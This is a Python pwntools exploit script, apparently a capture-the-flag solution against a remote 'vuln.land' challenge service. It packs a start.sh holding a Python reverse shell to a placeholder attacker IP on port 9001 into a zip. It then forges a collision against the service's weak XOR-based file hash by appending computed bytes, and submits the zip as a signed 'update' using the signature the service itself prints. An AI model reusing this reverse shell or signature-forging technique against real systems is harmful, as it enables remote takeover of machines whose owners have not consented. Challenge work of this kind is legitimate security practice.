import io
import zipfile

from pwn import *

zip_buffer = io.BytesIO()

with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
    zip_file.writestr('start.sh', b'''
    export RHOST="<IP>";
    export RPORT=9001;
    python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' \
    ''')


def hashFile(fileContent: bytes) -> int:
    hash = 0
    for i in range(0, len(fileContent), 8):
        hash ^= sum([fileContent[i + j] << 8 * j for j in range(8) if i + j < len(fileContent)])
    return hash


def int_to_bytes(x: int) -> bytes:
    return x.to_bytes((x.bit_length() + 7) // 8, 'big')


content = bytearray(zip_buffer.getvalue())

for i in range(8 - len(content) % 8):
    content.append(0)

expectedHash = 2222991296195092273
currentHash = hashFile(content)
diff = currentHash ^ expectedHash

magic = int_to_bytes(diff)[::-1]  # reverse due to little endian encoding
content = content + magic

assert hashFile(content) == expectedHash

io = remote('<INSTANCE>.rdocker.vuln.land', 1337)
io.recvuntil(b'$')
io.sendline(b'version')
io.recvline()

signature = io.recvline().split(b'Signature: ')[1][:-1]

io.sendline(b'update')
io.sendline(base64.b64encode(content))
io.sendline(signature)

io.interactive()
